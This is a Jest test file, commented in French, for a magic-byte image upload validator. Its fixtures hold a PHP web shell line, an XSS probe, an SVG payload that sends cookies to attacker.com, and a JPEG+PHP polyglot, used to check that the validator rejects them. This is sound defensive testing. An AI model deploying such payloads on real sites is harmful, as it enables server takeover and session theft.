import { describe, it, expect } from '@jest/globals';
import { detectMagicBytes } from '../magic-bytes';

// Signatures minimales valides
const JPEG_MAGIC = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01]);
const PNG_MAGIC  = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D]);
const WEBP_MAGIC = Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50]);

// Contenus non-image
const PHP_BYTES  = Buffer.from('<?php system($_GET["cmd"]); ?>');
const HTML_BYTES = Buffer.from('<html><body><script>alert(1)</script></body></html>');
const SVG_BYTES  = Buffer.from('<svg onload="fetch(\'https://attacker.com/\'+document.cookie)">');
const TEXT_BYTES = Buffer.from('Hello world, I am not an image');

// Polyglot : magic bytes JPEG valides + payload PHP à partir de l'octet 12
const POLYGLOT_JPEG_PHP = Buffer.concat([JPEG_MAGIC, Buffer.from('<?php system($_GET["cmd"]); ?>')]);

describe('detectMagicBytes', () => {
  describe('formats autorisés', () => {
    it('reconnaît JPEG', () => {
      expect(detectMagicBytes(JPEG_MAGIC)).toBe('image/jpeg');
    });

    it('reconnaît PNG', () => {
      expect(detectMagicBytes(PNG_MAGIC)).toBe('image/png');
    });

    it('reconnaît WebP', () => {
      expect(detectMagicBytes(WEBP_MAGIC)).toBe('image/webp');
    });
  });

  describe('contenus non-image rejetés', () => {
    it('rejette PHP', () => expect(detectMagicBytes(PHP_BYTES)).toBeNull());
    it('rejette HTML', () => expect(detectMagicBytes(HTML_BYTES)).toBeNull());
    it('rejette SVG', () => expect(detectMagicBytes(SVG_BYTES)).toBeNull());
    it('rejette texte brut', () => expect(detectMagicBytes(TEXT_BYTES)).toBeNull());
  });

  describe('cas limites', () => {
    it('retourne null pour buffer < 12 octets', () => {
      expect(detectMagicBytes(Buffer.from([0xFF, 0xD8]))).toBeNull();
    });

    it('retourne null pour buffer vide', () => {
      expect(detectMagicBytes(Buffer.alloc(0))).toBeNull();
    });

    it('retourne null pour buffer exactement 11 octets (< 12 requis)', () => {
      expect(detectMagicBytes(Buffer.alloc(11, 0xFF))).toBeNull();
    });

    it('accepte buffer exactement 12 octets WebP', () => {
      expect(detectMagicBytes(WEBP_MAGIC)).toBe('image/webp');
    });
  });

  describe('limite documentée — polyglots', () => {
    it('accepte polyglot JPEG+PHP : magic bytes valides, payload arbitraire après octet 12', () => {
      // Ce test documente la limite connue du check magic bytes.
      // Le polyglot passe car les 12 premiers octets sont un JPEG valide.
      // En production : atténué par X-Content-Type-Options: nosniff + Cache-Control: private.
      // Le payload PHP ne peut pas s'exécuter via une balise <img> avec nosniff.
      expect(detectMagicBytes(POLYGLOT_JPEG_PHP)).toBe('image/jpeg');
    });
  });
});
